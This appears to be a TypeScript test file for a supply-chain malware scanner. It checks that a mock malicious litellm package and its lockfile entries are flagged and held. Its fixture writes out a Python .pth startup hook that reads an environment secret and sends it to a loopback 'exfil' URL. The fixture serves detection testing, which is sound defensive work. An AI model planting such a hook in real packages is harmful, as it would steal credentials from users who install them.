import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { maxDeterministicRisk, RiskLevel } from '@astram/types';
import { JevDecisionClient, scanLockfile, scanPythonPth } from './index.js';

/**
 * CONTRACTS §10 TEST-01 fixture (literal): the mock litellm 1.107.0 package
 * ships evil_init.pth reading AEGIS_CANARY_SECRET_999 from env and exfiltrating
 * to the loopback canary listener. Static data only — never executed.
 */
const EVIL_INIT_PTH = [
  'import os, urllib.request',
  'urllib.request.urlopen("http://127.0.0.1:19999/exfil?s=" + os.environ.get("AEGIS_CANARY_SECRET_999", ""))',
].join('\n');

const REQUIREMENTS_TXT = 'litellm==1.107.0\nrequests>=2.28\n';

const PYPROJECT_TOML = [
  '[project]',
  'name = "mock-app"',
  'dependencies = [',
  '  "litellm==1.107.0",',
  '  "requests>=2.28",',
  ']',
].join('\n');

describe('TEST-01 — litellm 1.107.0 startup credential stealer (unit mirror)', () => {
  // Keep "no API key" deterministic even if the dev machine exports JEV_* vars.
  const ENV_KEYS = ['JEV_API_KEY', 'JEV_API_BASE_URL', 'JEV_MODEL_ID'] as const;
  let saved: Record<string, string | undefined> = {};
  beforeEach(() => {
    saved = {};
    for (const k of ENV_KEYS) {
      saved[k] = process.env[k];
      delete process.env[k];
    }
  });
  afterEach(() => {
    for (const k of ENV_KEYS) {
      if (saved[k] === undefined) delete process.env[k];
      else process.env[k] = saved[k];
    }
  });

  it('scanPythonPth: categories ⊇ {STARTUP_HOOK, CRED_ACCESS, NET_EGRESS}, max deterministic risk HOLD', () => {
    const facts = scanPythonPth(EVIL_INIT_PTH, 'fixtures/evil_init.pth');
    const categories = new Set(facts.map((f) => f.category));
    expect(categories.has('STARTUP_HOOK')).toBe(true);
    expect(categories.has('CRED_ACCESS')).toBe(true);
    expect(categories.has('NET_EGRESS')).toBe(true);
    expect(maxDeterministicRisk(facts)).toBe(RiskLevel.HOLD);
    // Both non-import lines are PY_PTH_CODE HOLD startup hooks.
    expect(facts.filter((f) => f.ruleId === 'PY_PTH_CODE').map((f) => f.line)).toEqual([1, 2]);
    expect(facts.some((f) => f.ruleId === 'PTH_EXFIL_CHAIN')).toBe(true);
  });

  it('scanLockfile flags litellm<=1.107.0 HOLD from requirements.txt and pyproject.toml', () => {
    const reqFacts = scanLockfile(REQUIREMENTS_TXT, 'pip', 'fixtures/requirements.txt');
    expect(reqFacts).toHaveLength(1);
    expect(reqFacts[0]!.ruleId).toBe('LOCKFILE_KNOWN_BAD');
    expect(reqFacts[0]!.deterministicRisk).toBe(RiskLevel.HOLD);

    const tomlFacts = scanLockfile(PYPROJECT_TOML, 'pyproject', 'fixtures/pyproject.toml');
    expect(tomlFacts).toHaveLength(1);
    expect(tomlFacts[0]!.deterministicRisk).toBe(RiskLevel.HOLD);
  });

  it('JevDecisionClient with no API key returns {finalRisk: HOLD, apiDelta: 0} (fail-closed)', async () => {
    const facts = scanPythonPth(EVIL_INIT_PTH, 'fixtures/evil_init.pth');
    const client = new JevDecisionClient(); // no key in env (unit env is clean here)
    const res = await client.evaluateAstFacts('litellm', 'LLM proxy library', facts);
    expect(res.finalRisk).toBe(RiskLevel.HOLD);
    expect(res.apiDelta).toBe(0);
  });

  it('the scanner performs no network or filesystem I/O (pure string ops only)', () => {
    // Static-data smoke: repeated scans are pure and give identical results.
    const a = JSON.stringify(scanPythonPth(EVIL_INIT_PTH, 'f.pth'));
    const b = JSON.stringify(scanPythonPth(EVIL_INIT_PTH, 'f.pth'));
    expect(a).toBe(b);
  });
});
